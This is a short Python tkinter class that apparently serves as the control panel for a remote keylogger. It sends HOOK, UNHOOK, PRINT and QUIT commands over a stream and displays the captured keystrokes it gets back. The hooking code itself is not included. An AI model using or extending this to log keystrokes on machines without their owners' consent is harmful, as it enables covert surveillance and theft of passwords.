from keylogDesigner import KeylogApp
import tkinter as tk

class Key(KeylogApp):
    def __init__(self, nw, nr, ns):
        super().__init__()
        self.nw = nw
        self.nr = nr
        self.ns = ns
        self.data = ""

    def send_hook(self):
        s = "HOOK"
        self.nw.write(s + "\n")
        self.nw.flush()

    def send_unhook(self):
        s = "UNHOOK"
        self.nw.write(s + "\n")
        self.nw.flush()

    def send_print(self):
        s = "PRINT"
        self.nw.write(s + "\n")
        self.nw.flush()
        data = self.nr.readline().strip()
        self.data = data + self.data[len(data):]
        self.txtKQ.config(state='normal')
        self.txtKQ.insert("end", self.data)
        self.txtKQ.config(state='disabled')

    def on_closing(self):
        s = "QUIT"
        self.nw.write(s + "\n")
        self.nw.flush()
        self.destroy()

    def clear_text(self):
        self.txtKQ.config(state='normal')
        self.txtKQ.delete('1.0', tk.END)
        self.txtKQ.config(state='disabled')